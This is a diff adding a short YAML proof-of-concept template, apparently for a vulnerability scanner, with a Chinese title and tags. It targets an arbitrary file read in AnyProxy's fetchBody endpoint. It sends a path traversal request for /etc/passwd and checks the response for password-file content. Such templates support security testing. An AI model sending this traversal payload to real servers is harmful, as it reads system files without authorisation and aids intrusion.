@@ -1,0 +1,15 @@
+id: poc-yaml-anyproxy-fetchBody-arbitrary-file-read
+info:
+  name: AnyProxy-fetchBody-文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: AnyProxy
+requests:
+- method: GET
+  path: /fetchBody?id=1/../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<") && contains(headers, "THIS IS A REQUEST FROM ANYPROXY
+    WEB INTERFACE")
+variables: {}
+transport: http
